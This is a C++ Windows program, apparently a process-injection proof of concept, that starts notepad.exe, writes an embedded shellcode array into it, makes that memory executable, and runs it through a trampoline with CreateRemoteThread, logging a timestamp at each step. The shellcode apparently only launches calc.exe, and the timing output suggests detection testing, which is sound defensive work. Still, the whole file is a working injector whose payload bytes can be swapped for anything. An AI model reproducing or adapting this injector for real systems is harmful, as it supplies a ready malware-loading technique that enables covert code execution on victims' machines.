#include <windows.h>
#include <iostream>
#include <iomanip>
#include <sstream>

// print current timestamp in ISO 8601 format, e.g. 2025-08-18 18:03:51.123Z
void printCurrentTime(std::string prefix) {
    SYSTEMTIME st;
    GetSystemTime(&st);
    std::cout << prefix
        << std::setfill('0')
        << std::setw(4) << st.wYear << '-'
        << std::setw(2) << st.wMonth << '-'
        << std::setw(2) << st.wDay << ' '
        << std::setw(2) << st.wHour << ':'
        << std::setw(2) << st.wMinute << ':'
        << std::setw(2) << st.wSecond << '.'
        << std::setw(3) << st.wMilliseconds
		<< "Z\n";
}

int main(int argc, char** argv) {
	enum StartupMode { NoWait, WaitTime, WaitForEnter };
	StartupMode s = WaitForEnter; // default mode
    int waitTime = 0;

    if (argc < 2) {
        s = WaitForEnter;
    }
    else if (strcmp(argv[1], "--no-wait") == 0) {
        s = NoWait;
    }
    else if (strcmp(argv[1], "--wait") == 0) {
        s = WaitTime;
        if (argc < 3) {
            waitTime = 3; // default wait time
        }
        else {
            waitTime = strtol(argv[2], NULL, 10);
        }
    }

    // print current PID
	std::cout << "Injector started. PID: " << GetCurrentProcessId() << "\n";

    // start new process to inject to
    LPCWSTR newProcess = L"C:\\Windows\\System32\\notepad.exe";
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcess(newProcess, nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
        std::cerr << "Failed to start process: " << GetLastError() << "\n";
        return 1;
    }

    std::cout << "New process started. PID: " << pi.dwProcessId << "\n";
	printCurrentTime("Process started at: ");
    switch (s) {
        case NoWait:
            break;
        case WaitTime:
            for (int i = waitTime; i > 0; i--) {
                std::cout << "Starting injection in " << i << "\n";
                Sleep(1000);
            };
            break;
        case WaitForEnter:
            std::cout << "Press ENTER to start injection...\n";
            std::cin.get();;
        default:
            break;
    }

    // open process with read/write access
    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pi.dwProcessId);
    if (!hProcess) {
        std::cerr << "Failed to open process: " << GetLastError() << "\n";
        return 1;
    }

	// byte array of value to write
    BYTE shellcode[] = { 0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x00};

    // allocate memory to new process
    LPVOID remoteAddrShellCode = VirtualAllocEx(hProcess, nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (remoteAddrShellCode) {
        std::cout << "Memory allocated at address: " << remoteAddrShellCode << "\n";
    }
    else {
        std::cerr << "Failed to allocate memory: " << GetLastError() << "\n";
        return 1;
    }

	// read process memory information
	MEMORY_BASIC_INFORMATION mbi;
    if (VirtualQueryEx(hProcess, remoteAddrShellCode, &mbi, sizeof(mbi))) {
        std::cout << "Memory region at address: " << remoteAddrShellCode << " is 0x" << std::hex
            << mbi.State << std::dec << " with protection: " << mbi.Protect << "\n";
    }
    else {
        std::cerr << "Failed to query memory: " << GetLastError() << "\n";
        VirtualFreeEx(hProcess, remoteAddrShellCode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
	}

    // write value into process' memory
    SIZE_T bytesWritten;
    if (WriteProcessMemory(hProcess, remoteAddrShellCode, &shellcode, sizeof(shellcode), &bytesWritten)) {
        std::cout << "Value written to address: " << remoteAddrShellCode << "\n";
    }
    else {
        std::cerr << "Failed to write memory: " << GetLastError() << "\n";
        return 1;
    }

    printCurrentTime("Shellcode injected at: ");

    BYTE trampoline[12] = { 0x48, 0xB8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xFF, 0xE0 };
    memcpy(&trampoline[2], &remoteAddrShellCode, 8);

    std::cout << "Trampoline Op Code: ";
    for (size_t i = 0; i < 12; i++) {
        std::cout << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(trampoline[i]) << " ";
    }
    std::cout << std::dec << "\n";

    // allocate memory for trampoline
    LPVOID remoteAddrTrampoline = VirtualAllocEx(hProcess, nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (remoteAddrTrampoline) {
        std::cout << "Trampoline Memory allocated at address: " << remoteAddrTrampoline << "\n";
    }
    else {
        std::cerr << "Failed to allocate trampoline memory: " << GetLastError() << "\n";
        return 1;
    }

    // write value into process' memory
    if (WriteProcessMemory(hProcess, remoteAddrTrampoline, &trampoline, sizeof(trampoline), &bytesWritten)) {
        std::cout << "Value written to address: " << remoteAddrTrampoline << "\n";
    }
    else {
        std::cerr << "Failed to write memory: " << GetLastError() << "\n";
        return 1;
    }


	// change memory protection to executable
    DWORD oldProtect;
    if (VirtualProtectEx(hProcess, remoteAddrShellCode, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProtect)) {
        std::cout << "Memory protection changed to PAGE_EXECUTE_READ.\n";
    }
    else {
        std::cerr << "Failed to change memory protection: " << GetLastError() << "\n";
        VirtualFreeEx(hProcess, remoteAddrShellCode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    if (VirtualProtectEx(hProcess, remoteAddrTrampoline, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProtect)) {
        std::cout << "Trampoline memory protection changed to PAGE_EXECUTE_READ.\n";
    }
    else {
        std::cerr << "Failed to change memory protection: " << GetLastError() << "\n";
        VirtualFreeEx(hProcess, remoteAddrShellCode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    printCurrentTime("RX protection at: ");

	// call create remote thread
	HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteAddrTrampoline, nullptr, 0, nullptr);
    if (hThread) {
        std::cout << "Remote thread created successfully.\n";
        printCurrentTime("Shellcode called at: ");
    }
    else {
        std::cerr << "Failed to create remote thread: " << GetLastError() << "\n";
        return 1;
	}

    return 0;
}
